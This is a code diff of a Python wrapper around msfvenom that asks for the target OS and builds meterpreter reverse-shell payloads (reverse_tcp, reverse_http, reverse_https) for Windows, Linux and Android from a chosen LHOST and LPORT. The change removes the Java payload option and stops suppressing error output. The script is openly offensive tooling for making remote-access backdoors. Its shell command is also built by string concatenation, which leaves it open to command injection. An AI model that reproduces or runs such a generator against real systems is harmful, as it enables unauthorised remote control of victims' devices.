@@ -13,8 +13,10 @@ def generatePayload(lhost, lport, payload, location):
     if payloadTyp == "android":
         payloadTyp = ".apk"
 
+
+
     os.system("msfvenom -p " + payload + " LHOST=" + lhost + " LPORT=" +
-              lport + " R > " + location + "/payload" + payloadTyp + " 2>/dev/null")
+              lport + " R > " + location + "/payload" + payloadTyp)
     print("Payload generated!")
 
 def chooseOptions(options):
@@ -39,11 +41,6 @@ def linux():
     chooseOptions(options)
 
 
-def java():
-
-    options = ["java/meterpreter/reverse_tcp",
-               "java/meterpreter/reverse_http", "java/meterpreter/reverse_https"]
-    chooseOptions(options)
 
 
 def android():
@@ -68,7 +65,7 @@ def main():
              |___/                                                  |___/ 
 
     """)
-    options = ["Windows", "Linux", "Java", "Android"]
+    options = ["Windows", "Linux", "Android"]
 
     choice = enquiries.choose("What is the target OS?", options)
     globals()[choice.lower()]()
